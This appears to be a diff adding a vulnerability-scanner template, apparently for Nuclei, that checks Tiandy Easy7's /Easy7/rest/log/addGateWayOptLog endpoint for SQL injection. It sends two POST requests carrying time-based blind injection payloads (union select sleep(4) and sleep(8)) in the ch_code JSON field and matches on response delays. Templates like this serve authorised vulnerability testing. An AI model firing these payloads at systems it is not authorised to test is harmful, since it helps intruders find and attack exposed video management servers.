@@ -1,0 +1,39 @@
+id: TianDiWeiYe-Easy7-addGateWayOptLog-SQL
+
+info:
+  name: 天地伟业Easy7 addGateWayOptLog SQL注入
+  author: HuanXiong
+  severity: high
+  reference: |
+    -
+  tags: SQL Injection
+  
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/log/addGateWayOptLog HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Length: 99
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+        gateLog={"gateLogList":[{"ch_code":"111'union select sleep(4)--+","ch_caption":"1","dt_time":"1"}]}
+        
+      - |
+        POST /Easy7/rest/log/addGateWayOptLog HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Length: 99
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+        gateLog={"gateLogList":[{"ch_code":"111'union select sleep(8)--+","ch_caption":"1","dt_time":"1"}]}
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
